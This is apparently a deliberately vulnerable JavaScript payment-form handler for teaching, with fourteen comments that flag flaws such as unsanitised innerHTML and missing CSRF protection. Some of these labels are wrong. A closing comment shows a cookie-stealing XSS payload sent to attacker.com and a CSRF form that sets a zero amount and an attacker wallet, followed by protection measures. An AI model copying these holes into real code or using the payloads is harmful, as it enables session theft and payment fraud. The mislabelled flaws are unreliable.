// VULNERABILITY 1: No Input Validation
// VULNERABILITY 2: No CSRF Protection
// VULNERABILITY 3: XSS Possible

class PaymentHandler {
    constructor() {
        this.paymentForm = document.querySelector('form');
        this.paymentStatus = document.getElementById('payment-status');
        this.paymentAddress = document.getElementById('payment-address');
        this.paymentAmount = document.getElementById('payment-amount');
        this.paymentCurrency = document.getElementById('payment-currency');
        this.paymentNetwork = document.getElementById('payment-network');
        this.orderId = null;
    }

    // VULNERABILITY 4: No Error Handling
    async processPayment(formData) {
        try {
            const response = await fetch('process_payment.php', {
                method: 'POST',
                body: formData
            });

            // VULNERABILITY 5: No Response Validation
            const data = await response.json();
            
            if (data.success) {
                this.orderId = data.order_id;
                this.showPaymentDetails(data);
                this.startPaymentCheck();
            } else {
                // VULNERABILITY 6: XSS in Error Messages
                this.paymentStatus.innerHTML = `Error: ${data.error}`;
            }
        } catch (error) {
            // VULNERABILITY 7: Exposed Error Details
            this.paymentStatus.innerHTML = `Error: ${error.message}`;
        }
    }

    // VULNERABILITY 8: No Payment Verification
    showPaymentDetails(data) {
        // VULNERABILITY 9: XSS in Payment Details
        this.paymentAddress.innerHTML = `Send payment to: ${data.payment_address}`;
        this.paymentAmount.innerHTML = `Amount: ${data.amount}`;
        this.paymentCurrency.innerHTML = `Currency: ${data.currency}`;
        this.paymentNetwork.innerHTML = `Network: ${data.network}`;
    }

    // VULNERABILITY 10: No Rate Limiting
    async startPaymentCheck() {
        const checkInterval = setInterval(async () => {
            try {
                const formData = new FormData();
                formData.append('action', 'check_status');
                formData.append('order_id', this.orderId);

                const response = await fetch('process_payment.php', {
                    method: 'POST',
                    body: formData
                });

                // VULNERABILITY 11: No Response Validation
                const data = await response.json();

                if (data.status === 'completed') {
                    clearInterval(checkInterval);
                    // VULNERABILITY 12: XSS in Success Message
                    this.paymentStatus.innerHTML = 'Payment completed successfully!';
                }
            } catch (error) {
                // VULNERABILITY 13: Exposed Error Details
                this.paymentStatus.innerHTML = `Error checking status: ${error.message}`;
                clearInterval(checkInterval);
            }
        }, 5000); // Check every 5 seconds
    }
}

// VULNERABILITY 14: No Form Validation
document.addEventListener('DOMContentLoaded', () => {
    const paymentHandler = new PaymentHandler();
    const form = document.querySelector('form');

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(form);
        paymentHandler.processPayment(formData);
    });
});

/**
 * Example of how these vulnerabilities could be exploited:
 * 
 * 1. XSS Attack:
 *    <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
 * 
 * 2. CSRF Attack:
 *    <form action="http://vulnerable-site.com/process_payment.php" method="POST">
 *      <input type="hidden" name="amount" value="0">
 *      <input type="hidden" name="wallet_address" value="attacker_wallet">
 *    </form>
 *    <script>document.forms[0].submit()</script>
 * 
 * 3. Payment Manipulation:
 *    Modify form data before submission
 * 
 * 4. Status Manipulation:
 *    Intercept and modify API responses
 * 
 * PROTECTION MEASURES:
 * 
 * 1. Validate all input
 * 2. Implement CSRF tokens
 * 3. Sanitize output
 * 4. Use secure headers
 * 5. Implement rate limiting
 * 6. Verify API responses
 * 7. Use secure session handling
 * 8. Implement proper error handling
 * 9. Use secure communication
 * 10. Validate payment amounts
 */ 